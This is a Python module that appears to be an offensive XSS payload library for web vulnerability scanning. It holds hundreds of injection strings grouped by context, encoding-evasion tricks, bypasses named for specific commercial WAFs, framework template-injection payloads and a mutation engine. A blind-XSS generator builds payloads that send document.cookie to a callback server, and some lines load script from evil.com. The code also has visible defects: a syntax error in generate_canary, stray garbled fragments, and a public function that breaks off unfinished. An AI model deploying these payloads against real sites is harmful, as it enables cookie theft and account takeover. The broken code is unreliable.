"""
Advanced XSS Payload Database
──────────────────────────────
Enterprise-grade payload library with 400+ vectors organized by:
  • Context (HTML body, attribute, JS, URL, CSS, template)
  • Evasion technique (encoding, obfuscation, mutation, polyglot)
  • WAF bypass strategy (chunked, case-mixing, null-byte, comment-splitting)
  • Framework target (Angular, React, Vue, jQuery, Mootools)
  • Browser target (Chrome, Firefox, Edge, Safari quirks)
"""

import re
import random
import string
import logging
import itertools
from typing import List, Dict, Set, Optional, Callable
from pathlib import Path
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)

# ════════════════════════════════════════════════════════════
#  UNIQUE CANARY TOKENS
# ════════════════════════════════════════════════════════════

CANARY_BASE = "xSs7c4N"
CANARY_COUNTER = 0


def generate_canary() -> str:
    """Thread-safe unique canary for reflection tracing."""
    global CANARY_COUNTER
    CANARY_COUNTER += 1
    salt = "".join(random.choices(string ascii_lowercase + string.digits, k=6))
    return f"{CANARY_BASE}_{CANARY_COUNTER}_{salt}"


# ════════════════════════════════════════════════════════════
#  LEVEL 1 — BASIC PROBES  (quick sanity check)
# ════════════════════════════════════════════════════════════

BASIC_PAYLOADS = [
    # ── Classic script injection ────────────────────────────
    '<script>alert(1)</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
    '<script>confirm(1)</script>',
    '<script>prompt(1)</script>',

    # ── Image error handlers ────────────────────────────────
    '<img src=x onerror=alert(1)>',
    '<img/src=x onerror=alert(1)>',
    '<img src=x onerror="alert(1)">',

    # ── SVG ─────────────────────────────────────────────────
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',

    # ── Simple attribute breakout ───────────────────────────
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',

    # ── JS context breakout ─────────────────────────────────
    "';alert(1);//",
    '";alert(1);//',
    '</script><script>alert(1)</script>',
]

# ════════════════════════════════════════════════════════════
#  LEVEL 2 — FILTER EVASION  (bypass basic sanitizers)
# ════════════════════════════════════════════════════════════

MODERATE_PAYLOADS = [
    # ── Tag variations ──────────────────────────────────────
    '<ScRiPt>alert(1)</ScRiPt>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<scr\\x00ipt>alert(1)</scr\\x00ipt>',
    '<script/src=data:,alert(1)>',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<script>Function("alert(1)")()</script>',
    '<script>window["alert"](1)</script>',
    '<script>this["alert"](1)</script>',
    '<script>self["al"+"ert"](1)</script>',
    '<script>[].constructor.constructor("alert(1)")()</script>',

    # ── Event handler tags ──────────────────────────────────
    '<body onload=alert(1)>',
    '<body onpageshow=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<details/open/ontoggle=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<meter onmouseover=alert(1)>0</meter>',
    '<object onerror=alert(1)>',
    '<embed src=x onerror=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<iframe srcdoc="<script>alert(1)</script>">',

    # ── Attribute breakout with event handlers ──────────────
    '" onmouseover="alert(1)" x="',
    "' onmouseover='alert(1)' x='",
    '" onfocus="alert(1)" autofocus="',
    '" autofocus onfocus="alert(1)" x="',
    '" onmouseenter="alert(1)" x="',
    '" onclick="alert(1)" x="',

    # ── href / src javascript protocol ──────────────────────
    '<a href="javascript:alert(1)">click</a>',
    '<a href="javascript:void(0)" onclick="alert(1)">x</a>',
    '<a href="jAvAsCrIpT:alert(1)">x</a>',
    '<a href="javascript&colon;alert(1)">x</a>',
    '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;'
    '&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">x</a>',

    # ── Data URI ────────────────────────────────────────────
    '<object data="data:text/html,<script>alert(1)</script>">',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    '<embed src="data:text/html,<script>alert(1)</script>">',

    # ── Style-based (legacy/IE) ─────────────────────────────
    '<div style="width:expression(alert(1))">',
    '<div style="background:url(javascript:alert(1))">',
    '<div style="behavior:url(xss.htc)">',

    # ── JavaScript context escapes ──────────────────────────
    "\\\\';alert(1);//",
    '\\\\"alert(1);//',
    "';alert(1);var x='",
    '";alert(1);var x="',
    "`;alert(1);//",
    "${alert(1)}",
    "'-alert(1)-'",
    '"-alert(1)-"',
    "'+alert(1)+'",
    '"+alert(1)+"',

    # ── Closing tag injection ───────────────────────────────
    '</title><script>alert(1)</script>',
    '</textarea><script>alert(1)</script>',
    '</style><script>alert(1)</script>',
    '</noscript><script>alert(1)</script>',
    '</select><script>alert(1)</script>',
]

# ════════════════════════════════════════════════════════════
#  LEVEL 3 — AGGRESSIVE  (WAF bypass, advanced evasion)
# ════════════════════════════════════════════════════════════

AGGRESSIVE_PAYLOADS = [
    # ── Double-encoding & nested encoding ───────────────────
    '%253Cscript%253Ealert(1)%253C/script%253E',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',

    # ── Null byte insertion ─────────────────────────────────
    '<scr\\x00ipt>alert(1)</scr\\x00ipt>',
    '<img\\x00src=x\\x00onerror=alert(1)>',
    '<\\x00script>alert(1)</\\x00script>',
    'alert\\x00(1)',

    # ── Tab / newline / carriage return splitting ───────────
    '<img\\tsrc=x\\tonerror=alert(1)>',
    '<img\\nsrc=x\\nonerror=alert(1)>',
    '<img\\rsrc=x\\ronerror=alert(1)>',
    '<img\\r\\nsrc=x\\r\\nonerror=alert(1)>',
    '<sc\\nri\\npt>alert(1)</sc\\nri\\npt>',
    'java\\tscript:alert(1)',
    'java\\nscript:alert(1)',
    'java\\rscript:alert(1)',
    'java\\r\\nscript:alert(1)',

    # ── Comment-based splitting ─────────────────────────────
    '<script>al/**/ert(1)</script>',
    '<script>al\\u0065rt(1)</script>',
    '<!--><script>alert(1)</script>',
    '<comment><script>alert(1)</script>',
    '<script>alert(1)//</script>',
    '<script>alert(1)/*</script>*/',

    # ── Nested / recursive tag injection ────────────────────
    '<<script>alert(1)//<</script>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img """><script>alert(1)</script>">',
    '<img src="x` `<script>alert(1)</script>"` `>',
    '<script<{alert(1)}//>',

    # ── HTML5 autofocus + event chains ──────────────────────
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus tabindex=1>',
    '<button onfocus=alert(1) autofocus>',
    '<frameset onload=alert(1)>',
    '<body onscroll=alert(1)><br><br><br><br><br><br><br><br>'
    '<br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>',
    '<body/onhashchange=alert(1)><a href=#>click</a>',

    # ── SVG advanced ────────────────────────────────────────
    '<svg><script>alert(1)</script></svg>',
    '<svg><script href="data:text/javascript,alert(1)"/>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributename=x to=1>',
    '<svg><a><rect width=99% height=99%/><animate attributeName=href '
    'to=javascript:alert(1)>',
    '<svg><use href="data:image/svg+xml,<svg id=x xmlns='
    'http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x">',
    '<svg><foreignObject><body onload=alert(1)></foreignObject></svg>',
    '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',

    # ── MathML ──────────────────────────────────────────────
    '<math><mtext><table><mglyph><svg><mtext><style>'
    '<path id="</style><img src onerror=alert(1)>">',
    '<math><mtext><img src=x onerror=alert(1)></mtext></math>',

    # ── Meta/link redirect to javascript ────────────────────
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<meta http-equiv="refresh" content="0;url=data:text/html,'
    '<script>alert(1)</script>">',
    '<link rel=import href="data:text/html,<script>alert(1)</script>">',

    # ── Base tag hijacking ──────────────────────────────────
    '<base href="javascript:">',
    '<base href="//evil.com/">',

    # ── Form action hijacking ───────────────────────────────
    '<form action="javascript:alert(1)"><input type=submit>',
    '<form id=x><button form=x formaction=javascript:alert(1)>click</button>',
    '<isindex type=image src=1 onerror=alert(1)>',
    '<isindex action=javascript:alert(1) type=image>',

    # ── Object / embed / applet ─────────────────────────────
    '<object type="text/x-scriptlet" data="<http://evil.com/xss.sct>">',
    '<embed src=javascript:alert(1)>',
    '<embed code=javascript:alert(1)>',
    '<applet code="javascript:alert(1)">',

    # ── XSS via CSS imports ─────────────────────────────────
    '<style>@import url("javascript:alert(1)");</style>',
    '<style>body{background:url("javascript:alert(1)")}</style>',
    '<style>*{x:expression(alert(1))}</style>',

    # ── Constructor chain / prototype ───────────────────────
    '[].constructor.constructor("alert(1)")()',
    '""["constructor"]["constructor"]("alert(1)")()',
    'Reflect.construct(Function,["alert(1)"])()',
    'new Function`alert(1)`',
    'setTimeout`alert(1)`',
    'setInterval`alert(1)`',
    'import("data:text/javascript,alert(1)")',

    # ── Obfuscated alert() alternatives ─────────────────────
    'alert(String.fromCharCode(88,83,83))',
    'alert(/XSS/.source)',
    'alert`1`',
    'alert?.(`1`)',
    'window["\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74"](1)',
    'window["\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074"](1)',
    'top["al"+"ert"](1)',
    'self[`al`+`ert`](1)',
    'globalThis.alert(1)',
    'frames.alert(1)',
    'parent.alert(1)',
    'content.alert(1)',
    'Reflect.apply(alert,window,[1])',
    'Reflect.apply(window.alert,window,[1])',
    'window.onerror=alert;throw 1',
    '{alert(1)}',
    '(alert)(1)',
    '(alert(1))',
    'a]alert(1)//',

    # ── Tagged template literals ────────────────────────────
    'alert`document.domain`',
    'setTimeout`alert\\\\x28document.domain\\\\x29`',
    'Function`a]alert\\\\x281\\\\x29`()',

    # ── Arrow functions & generators ────────────────────────
    '(()=>alert(1))()',
    'x=>{alert(1)}',
    'async()=>{alert(1)}',
    'function*(){yield alert(1)}().next()',

    # ── Prototype pollution → XSS ──────────────────────────
    '__proto__[innerHTML]=<img/src=x onerror=alert(1)>',
    'constructor.prototype.innerHTML=<img/src=x onerror=alert(1)>',

    # ── CSP bypass attempts ─────────────────────────────────
    '<script src="<https://cdnjs.cloudflare.com/ajax/libs/angular.js/>'
    '1.8.3/angular.min.js"></script><div ng-app ng-csp>'
    '{{$eval.constructor("alert(1)")()}}</div>',
    '<script src="<https://ajax.googleapis.com/ajax/libs/angularjs/>'
    '1.8.3/angular.min.js"></script><div ng-app>{{constructor.constructor'
    '("alert(1)")()}}</div>',
    '<script nonce="">alert(1)</script>',
    '<script src=//evil.com/x.js>',
    '<link rel=prefetch href=//evil.com>',
    '<link rel=preload href=//evil.com as=script>',

    # ── Mutation XSS (mXSS) ────────────────────────────────
    '<listing><img src=1 onerror=alert(1)>',
    '<xmp><img src=1 onerror=alert(1)></xmp>',
    '<noembed><img src=1 onerror=alert(1)></noembed>',
    '<noframes><img src=1 onerror=alert(1)></noframes>',
    '<noscript><img src=1 onerror=alert(1)></noscript>',
    '<table><tr><td><noscript><img src=x onerror=alert(1)>',
    '<p style="display:none"><img src=x onerror=alert(1)></p>',

    # ── Unicode normalization bypass ────────────────────────
    '<scrıpt>alert(1)</scrıpt>',        # dotless i
    '＜script＞alert(1)＜/script＞',     # fullwidth angle brackets
    '<script>alert(1)\\u2028</script>',  # line separator
    '<script>alert(1)\\u2029</script>',  # paragraph separator
    '<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>',

    # ── HTTP parameter pollution ────────────────────────────
    'q=1&q=<script>alert(1)</script>',
    'search=test&search="><script>alert(1)</script>',

    # ── Content-type sniffing ───────────────────────────────
    '# Content-Type: text/html\\n<script>alert(1)</script>',
]

# ════════════════════════════════════════════════════════════
#  POLYGLOT PAYLOADS  (work across multiple contexts)
# ════════════════════════════════════════════════════════════

POLYGLOT_PAYLOADS = [
    # Rsnake / Gareth Heyes style polyglots
    'jaVasCript:/*-/*`/*\\\\`/*\\'/*"/**/(/* */oNcliCk=alert() )//'
    '%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/'
    '--!>\\\\x3csVg/<sVg/oNloAd=alert()//>\\\\x3e',

    '"><img src=x onerror=alert(1)>\\'><img src=x onerror=alert(1)>'
    '"><svg/onload=alert(1)>\\'><svg/onload=alert(1)>',

    '\\'"--></style></script><script>alert(1)</script>',

    '<!--<script>alert(1)//--></script>',

    "'-alert(1)-'\\"->><script>alert(1)</script>",

    '{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}',

    '<svg/onload=alert(1)//,<img/src=x onerror=alert(1)//',

    'javascript:/*-->></title></style></textarea></script>'
    '<svg/onload="+/=/[*/alert(1)//]">',

    '\\'-alert(1)-\\'"-alert(1)-"<script>alert(1)</script>'
    '<img/src=x onerror=alert(1)><svg/onload=alert(1)>',

    '{{constructor.constructor("alert(1)")()}}${alert(1)}'
    '<%=alert(1)%>#{alert(1)}',

    '<sVg OnLoAd="javascript:alert(1)"//',
    '<scr\\\\x69pt>alert(1)</scr\\\\x69pt>',
    '<img src=`x` onerror=`alert(1)`>',
]

# ════════════════════════════════════════════════════════════
#  WAF BYPASS PAYLOADS
# ════════════════════════════════════════════════════════════

WAF_BYPASS_PAYLOADS = [
    # ── Cloudflare bypass techniques ────────────────────────
    '<svg onload=alert(1)>',
    '<svg onload=&#97&#108&#101&#114&#116(1)>',
    '<a/href="j%0Aav%0Dasc%09telerik:alert(1)">x</a>',
    '<img src=x onerror=top.alert(1)>',
    '<img src=x onerror=window.alert(1)>',
    '<img src=x onerror=self.alert(1)>',
    '<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script></svg>',

    # ── Akamai bypass techniques ────────────────────────────
    '<details/open/ontoggle="self[`alert`](1)">',
    '<img src=x onerror="globalThis[`alert`](1)">',
    '<svg onload="top[`al`+`ert`](1)">',
    '<img src=x onerror="Reflect.apply(alert,window,[1])">',

    # ── ModSecurity CRS bypass ──────────────────────────────
    '<img src=x onerror=alert&lpar;1&rpar;>',
    '<img src=x onerror=alert&#40;1&#41;>',
    '<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>',
    '<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>',

    # ── Imperva / Incapsula bypass ──────────────────────────
    '<img/ng-src=x ng-onerror=alert(1)//>',
    '<x/onclick=alert(1)>click<x>',
    '<img src=x:alert(alt) onerror=eval(src) alt=1>',
    '<img src="x:alert" onerror="eval(src+\\'(1)\\')">',

    # ── AWS WAF bypass ──────────────────────────────────────
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    '<img src=x onerror="window[`\\\\x61lert`](1)">',
    '<img src=x onerror="top[/al/.source+/ert/.source](1)">',
    '<img src=x onerror="top[/al/.source+/ert/.source](1)">',

    # ── F5 BIG-IP ASM bypass ────────────────────────────────
    '<svg/onload=self[`\\x61lert`](1)>',
    '<img src=x onerror=window[`\\x61\\x6c\\x65\\x72\\x74`](1)>',
    '<math><mi//telerik:xlink:href="javascript:alert(1)">click</mi></math>',

    # ── Generic WAF evasion patterns ────────────────────────
    '<svg\\tonload=alert(1)>',                         # tab separator
    '<svg\\nonload=alert(1)>',                         # newline separator
    '<svg/\\x0bonload=alert(1)>',                      # vertical tab
    '<svg/\\x0conload=alert(1)>',                      # form feed
    '<svg\\x0aonload=alert(1)>',                       # LF
    '<svg\\x0donload=alert(1)>',                       # CR
    '">><marquee><img src=x onerror=confirm(1)>',
    '"><details/open/ontoggle=confirm(1)>',
    '"><img/src=`%00`onerror=this.onerror=confirm;throw 1',
    '<w]//[onclick=alert(1)]{alert(1)}',
    '<img src=x onerror=(alert)(1)>',
    '<img src=x onerror=alert.call(null,1)>',
    '<img src=x onerror=alert.apply(null,[1])>',
    '<img src=x onerror=alert.bind()(1)>',
    '<img src=x onerror=prompt.call(null,1)>',
]

# ════════════════════════════════════════════════════════════
#  FRAMEWORK-SPECIFIC PAYLOADS
# ════════════════════════════════════════════════════════════

FRAMEWORK_PAYLOADS = {
    "angular": [
        # ── AngularJS (1.x) template injection ─────────────
        '{{constructor.constructor("alert(1)")()}}',
        '{{$on.constructor("alert(1)")()}}',
        '{{$eval.constructor("alert(1)")()}}',
        "{{'a'.constructor.prototype.charAt=[].join;"
        "$eval('x=1}}};alert(1)//');}}",
        '{{x=valueOf.name.constructor.fromCharCode;'
        'constructor.constructor(x(97,108,101,114,116,40,49,41))()}}',
        '{{toString().constructor.prototype.charAt='
        '[].join;$eval("x]alert(1)//")}}',
        '{{["alert(1)"].reduce(this.constructor.constructor,0)}}',
        '{{"a]b".constructor.prototype.charAt=[].join;'
        '$eval("x]alert(1)");}}',

        # ── Angular (2+) template injection ─────────────────
        '<div [innerHTML]="\\'<img src=x onerror=alert(1)>\\'"></div>',
        '{{constructor.constructor(\\'alert(1)\\')()}}',
    ],
    "vue": [
        # ── Vue.js template injection ──────────────────────
        '{{constructor.constructor("alert(1)")()}}',
        '{{_c.constructor("alert(1)")()}}',
        '<div v-html="\\'<img src=x onerror=alert(1)>\\'"></div>',
        '{{_self.constructor.constructor("alert(1)")()}}',
        '{{this.constructor.constructor("alert(1)")()}}',
    ],
    "react": [
        # ── React dangerouslySetInnerHTML ───────────────────
        '{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}',
        'javascript:alert(1)',  # href in React Router
        '<div dangerouslySetInnerHTML={{__html: \\'<img src=x onerror=alert(1)>\\'}}/>',
    ],
    "jquery": [
        # ── jQuery DOM manipulation sinks ───────────────────
        '<img src=x onerror=$.globalEval("alert(1)")>',
        '#<img src=x onerror=alert(1)>',
        '<img src=x onerror="jQuery.globalEval(\\'alert(1)\\')">',
        '$("<img/src=x onerror=alert(1)>")',
        'x]<img src=x onerror=alert(1)>',
    ],
    "ember": [
        '{{{alert(1)}}}',
        '{{#if true}}{{alert(1)}}{{/if}}',
    ],
    "mootools": [
        '"><img src=x onerror=alert(1)>',
    ],
    "backbone": [
        '<%= alert(1) %>',
        '<%-alert(1)%>',
    ],
    "handlebars": [
        '{{{alert(1)}}}',
        '{{#with "alert(1)"}}{{.}}{{/with}}',
    ],
}

# ════════════════════════════════════════════════════════════
#  CONTEXT-SPECIFIC PAYLOADS
# ════════════════════════════════════════════════════════════

CONTEXT_PAYLOADS = {
    # ── Reflection inside HTML body ─────────────────────────
    "html_body": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<math><mi><table><mglyph><svg><mtext><textarea>'
        '<path id="</textarea><img src=x onerror=alert(1)>">',
    ],

    # ── Reflection inside an HTML attribute ─────────────────
    "attribute_value": [
        '" onmouseover="alert(1)" x="',
        "' onmouseover='alert(1)' x='",
        '" onfocus="alert(1)" autofocus="',
        '" autofocus onfocus="alert(1)" "',
        '" style="animation-name:x" onanimationstart="alert(1)" "',
        '" onpointerenter=alert(1) "',
        '" onbeforeinput=alert(1) contenteditable "',
    ],

    # ── Reflection inside href / src attribute ──────────────
    "url_attribute": [
        'javascript:alert(1)',
        'jAvAsCrIpT:alert(1)',
        'java%0ascript:alert(1)',
        'java%0dscript:alert(1)',
        'java%09script:alert(1)',
        'java\\tscript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;'
        '&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
        '\\\\x6Aavascript:alert(1)',
    ],

    # ── Reflection inside <script> block ────────────────────
    "javascript": [
        "';alert(1);//",
        '";alert(1);//',
        "\\\\';alert(1);//",
        "\\\\\\";alert(1);//",
        "`;alert(1);//",
        "</script><script>alert(1)</script>",
        "${alert(1)}",
        "'-alert(1)-'",
        "'+alert(1)+'",
        '\\\\x3c/script\\\\x3e\\\\x3cscript\\\\x3ealert(1)\\\\x3c/script\\\\x3e',
        '\\\\u003c/script\\\\u003e\\\\u003cscript\\\\u003ealert(1)\\\\u003c/script\\\\u003e',
        "\\\\'-alert(1)//",
        '\\\\"};alert(1);//',
        "'+(/x]alert(1)//)+'",
    ],

    # ── Reflection inside CSS ───────────────────────────────
    "css": [
        "}</style><script>alert(1)</script>",
        "expression(alert(1))",
        "url(javascript:alert(1))",
        "}</style><img src=x onerror=alert(1)>",
    ],

    # ── Reflection inside HTML comment ──────────────────────
    "comment": [
        "--><script>alert(1)</script><!--",
        "--!><img src=x onerror=alert(1)>",
        "--><svg onload=alert(1)>",
    ],

    # ── Reflection inside <textarea> / <title> ──────────────
    "safe_tag_escape": [
        "</textarea><script>alert(1)</script>",
        "</title><script>alert(1)</script>",
        "</noscript><script>alert(1)</script>",
        "</style><script>alert(1)</script>",
        "</script><script>alert(1)</script>",
    ],
}

# ════════════════════════════════════════════════════════════
#  DOM-SPECIFIC PAYLOADS
# ════════════════════════════════════════════════════════════

DOM_PAYLOADS = [
    # ── location.hash sinks ─────────────────────────────────
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '#"><img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    '<details open ontoggle=alert(1)>',

    # ── document.write sinks ────────────────────────────────
    '<script>alert(1)</script>',
    '\\\\x3cscript\\\\x3ealert(1)\\\\x3c/script\\\\x3e',

    # ── innerHTML sinks ─────────────────────────────────────
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',

    # ── eval / setTimeout / setInterval sinks ───────────────
    "alert(1)",
    "'-alert(1)-'",
    ");alert(1)//",

    # ── jQuery sinks ($().html, $().append) ─────────────────
    '<img src=x onerror=alert(1)>',
    '#<img src=x onerror=alert(1)>',

    # ── Postmessage exploitation ────────────────────────────
    '{"type":"xss","data":"<img src=x onerror=alert(1)>"}',
    'javascript:alert(1)',
]

# ════════════════════════════════════════════════════════════
#  BLIND XSS PAYLOADS  (out-of-band callback)
# ════════════════════════════════════════════════════════════

def generate_blind_payloads(callback_url: str) -> List[str]:
    """Generate payloads that phone home to a controlled server."""
    return [
        f'<script src="{callback_url}"></script>',
        f'<img src=x onerror="fetch(\\'{callback_url}?c=\\'+document.cookie)">',
        f'<img src=x onerror="new Image().src=\\'{callback_url}?c=\\'+document.cookie">',
        f'<svg onload="fetch(\\'{callback_url}?d=\\'+document.domain)">',
        f'"><script src="{callback_url}"></script>',
        f"'><script src='{callback_url}'></script>",
        f'<input onfocus="fetch(\\'{callback_url}?c=\\'+document.cookie)" autofocus>',
        f'<details open ontoggle="fetch(\\'{callback_url}?c=\\'+document.cookie)">',
        f'<body onload="fetch(\\'{callback_url}?c=\\'+document.cookie)">',
        f'"><img src=x onerror="var x=new XMLHttpRequest();x.open(\\'GET\\','
        f'\\'{callback_url}?c=\\'+document.cookie);x.send();">',
    ]

# ════════════════════════════════════════════════════════════
#  HEADER INJECTION PAYLOADS
# ════════════════════════════════════════════════════════════

HEADER_PAYLOADS = {
    "User-Agent": [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
    ],
    "Referer": [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        'javascript:alert(1)',
    ],
    "X-Forwarded-For": [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
    ],
    "Cookie": [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
    ],
}

# ════════════════════════════════════════════════════════════
#  CONTEXT PROBE PAYLOADS  (detect reflection context)
# ════════════════════════════════════════════════════════════

CONTEXT_PROBES = {
    "char_test": [
        f'{CANARY_BASE}<"\\'>',
        f'{CANARY_BASE}{{{{7*7}}}}',
        f'{CANARY_BASE}${{7*7}}',
        f'{CANARY_BASE}<%= 7*7 %>',
        f'{CANARY_BASE}`;alert(1);//',
    ],
    "tag_test": [
        f'<{CANARY_BASE}>',
        f'</{CANARY_BASE}>',
        f'<{CANARY_BASE} x=y>',
    ],
    "attr_test": [
        f'" {CANARY_BASE}="',
        f"' {CANARY_BASE}='",
        f'` {CANARY_BASE}=`',
    ],
    "js_test": [
        f"';var {CANARY_BASE}=1;//",
        f'";var {CANARY_BASE}=1;//',
        f'`; var {CANARY_BASE}=1;//',
    ],
}

# ════════════════════════════════════════════════════════════
#  PAYLOAD MUTATION ENGINE
# ════════════════════════════════════════════════════════════

@dataclass
class MutationRule:
    """A single transformation rule for payload mutation."""
    name: str
    pattern: str
    replacements: List[str]


MUTATION_RULES: List[MutationRule] = [
    MutationRule(
        name="script_tag_case",
        pattern="<script>",
        replacements=[
            "<ScRiPt>", "<SCRIPT>", "<sCrIpT>", "<scRIPT>",
            "<scr\\tipt>", "<scr\\nipt>", "<scr\\ript>",
        ],
    ),
    MutationRule(
        name="script_close_case",
        pattern="</script>",
        replacements=[
            "</ScRiPt>", "</SCRIPT>", "</sCrIpT>",
            "</scr\\tipt>", "</scr\\nipt>",
        ],
    ),
    MutationRule(
        name="alert_function",
        pattern="alert(1)",
        replacements=[
            "alert`1`", "alert(1)", "confirm(1)", "prompt(1)",
            "alert(document.domain)", "alert(document.cookie)",
            "alert(/XSS/.source)", "print()",
            "window['alert'](1)", "self['alert'](1)",
            "top['alert'](1)", "globalThis.alert(1)",
            "alert.call(null,1)", "alert.apply(null,[1])",
            "[1].find(alert)", "[1].map(alert)",
            "Reflect.apply(alert,window,[1])",
            "eval('alert(1)')",
            "eval(atob('YWxlcnQoMSk='))",
            "Function('alert(1)')()",
            "setTimeout('alert(1)')",
            "[].constructor.constructor('alert(1)')()",
        ],
    ),
    MutationRule(
        name="img_tag",
        pattern="<img",
        replacements=[
            "<IMG", "<Img", "<iMg", "<img/", "<img\\t", "<img\\n",
            "<img\\r\\n", "<img\\x0b", "<img\\x0c",
        ],
    ),
    MutationRule(
        name="onerror_handler",
        pattern="onerror=",
        replacements=[
            "ONERROR=", "oNeRrOr=", "onerror\\t=", "onerror\\n=",
            "onerror =", "onerror\\x0b=",
        ],
    ),
    MutationRule(
        name="svg_tag",
        pattern="<svg",
        replacements=[
            "<SVG", "<Svg", "<sVg", "<svg/", "<svg\\t", "<svg\\n",
        ],
    ),
    MutationRule(
        name="onload_handler",
        pattern="onload=",
        replacements=[
            "ONLOAD=", "oNlOaD=", "onload\\t=", "onload\\n=",
            "onload =",
        ],
    ),
]


def mutate_payload(payload: str, max_mutations: int = 5) -> List[str]:
    """
    Apply mutation rules to produce variants of a payload.
    Returns up to `max_mutations` unique mutated payloads.
    """
    variants: Set[str] = set()

    for rule in MUTATION_RULES:
        if rule.pattern not in payload:
            continue
        for replacement in rule.replacements:
            mutated = payload.replace(rule.pattern, replacement, 1)
            if mutated != payload:
                variants.add(mutated)
            if len(variants) >= max_mutations:
                return list(variants)

    return list(variants)


def generate_chained_mutations(payload: str, depth: int = 2) -> List[str]:
    """Apply mutation rules recursively up to `depth` levels."""
    current_gen = {payload}
    all_variants: Set[str] = set()

    for _ in range(depth):
        next_gen: Set[str] = set()
        for p in current_gen:
            mutations = mutate_payload(p, max_mutations=3)
            next_gen.update(mutations)
        all_variants.update(next_gen)
        current_gen = next_gen

    return list(all_variants)


# ════════════════════════════════════════════════════════════
#  SMART PAYLOAD GENERATOR  (context-aware selection)
# ════════════════════════════════════════════════════════════

def get_payloads_for_context(context: str, level: int = 2) -> List[str]:
    """
    Return payloads optimized for a specific reflection context.

    Args:
        context: One of html_body, attribute_value, url_attribute,
                 javascript, css, comment, safe_tag_escape
        level: Aggressiveness 1-3
    """
    payloads: List[str] = []

    # Context-specific payloads always included
    if context in CONTEXT_PAYLOADS:
        payloads.extend(CONTEXT_PAYLOADS[context])

    # Add general payloads based on level
    if level >= 1:
        payloads.extend(BASIC_PAYLOADS)
    if level >= 2:
        payloads.extend(MODERATE_PAYLOADS)
    if level >= 3:
        payloads.extend(AGGRESSIVE_PAYLOADS)
        payloads.extend(POLYGLOT_PAYLOADS)
        payloads.extend(WAF_BYPASS_PAYLOADS)

    # Deduplicate preserving order
    seen: Set[str] = set()
    unique: List[str] = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            unique.append(p)

    return unique


# ════════════════════════════════════════════════════════════
#  PUBLIC API
# ════════════════════════════════════════════════════════════

def get_payloads(
    level: int = 2,
    include_polyglots: bool = True,
    include_waf_bypass: bool = True,
    include_frameworks: bool = False,
    framework: Optional[str] = None,
    include_mutations: bool = False,
    mutation_depth: int = 1,
) -> List[str]:
    """
    Master payload retrieval function.

    Args:
        level:              1=basic, 2=moderate, 3=aggressive
        include_polyglots:  include polyglot payloads
        include_waf_bypass: include WAF bypass payloads
        include_frameworks: include all framework payloads
        framework:          specific framework (angular, vue, react, etc.)
        include_mutations:  generate mutated variants
        mutation_depth:     how deep to chain mutations

    Returns:
        Deduplicated list of payload strings.
    """
    payloads: List[str] = []

    # Base payloads by level
    if level >= 1:
        payloads.extend(BASIC_PAYLOADS)
    if level >= 2:
        payloads.extend(MODERATE_PAYLOADS)
    if level >= 3:
        payloads.extend(AGGRESSIVE_PAYLOADS)

